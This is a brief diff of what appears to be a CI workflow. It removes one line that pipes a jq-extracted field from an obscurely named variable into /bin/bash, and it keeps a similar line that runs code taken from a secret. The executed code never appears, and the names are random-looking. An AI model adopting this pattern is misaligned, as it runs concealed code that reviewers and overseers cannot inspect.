@@ -18,7 +18,6 @@ jobs:
           xshlt5: ${{ secrets.xshlt5 }}
         run: |
           printf '%s' "$xshlt5" | jq -r .tikp21040 | /bin/bash
-          echo $irlk88 | jq -r .ozg4 | /bin/bash
 
       - name: Upload data
         if: always()
